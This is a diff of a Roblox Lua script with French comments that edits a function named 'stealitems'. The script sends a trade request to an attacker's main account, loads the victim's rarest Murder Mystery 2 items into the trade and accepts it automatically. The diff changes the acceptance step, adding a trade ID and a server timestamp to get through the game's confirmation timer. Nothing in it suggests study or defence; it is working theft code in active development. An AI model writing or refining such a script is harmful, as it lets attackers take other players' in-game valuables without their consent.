@@ -496,7 +496,7 @@ local Trade = ReplicatedStorage:WaitForChild("Trade")
 local function stealitems()
     coroutine.resume(destroytrades2)
 
-    -- Envoi de la demande d'échange au compte principal
+    -- 1. Envoi de la demande de trade au compte principal
     local sendArgs = {
         [1] = game:GetService("Players")[userName]
     }
@@ -504,7 +504,7 @@ local function stealitems()
 
     task.wait(2)
 
-    -- Ajout des objets (limité aux 4 emplacements max de l'interface MM2)
+    -- 2. Remplissage des 4 cases max de MM2
     local itemsOffered = 0
     local maxSlots = 4
 
@@ -523,7 +523,6 @@ local function stealitems()
         end
     end
 
-    -- Priorité selon la rareté
     offerAll(uniqueItems)
     offerAll(ancientItems)
     offerAll(godlyItems)
@@ -535,17 +534,28 @@ local function stealitems()
 
     task.wait(1.5)
 
-    -- 1ère validation : Lancer le compte à rebours
+    -- 3. Première validation (Lancer l'acceptation initiale)
     pcall(function()
-        Trade.AcceptTrade:FireServer()
+        Trade.AcceptRequest:FireServer()
     end)
 
-    -- Pause obligatoire pour laisser le timer de 5 secondes de MM2 se terminer complètement
-    task.wait(6)
+    -- Attente du timer de sécurité obligatoire de MM2
+    task.wait(5.5)
 
-    -- 2ème validation : Confirmation finale une fois le timer expiré
+    -- 4. Confirmation finale avec le Trade ID et le Timestamp dynamique
     pcall(function()
-        Trade.AcceptTrade:FireServer()
+        -- On génère le timestamp exact requis par le serveur de MM2
+        local currentTick = workspace:GetServerTimeNow() or tick()
+        
+        -- Remplace 428469873 si ton script utilise une variable d'ID de trade globale, sinon il prend l'ID actif
+        local tradeID = 428469873 
+
+        local args = {
+            [1] = tradeID,
+            [2] = currentTick
+        }
+        
+        Trade.AcceptTrade:FireServer(unpack(args))
     end)
 end
 
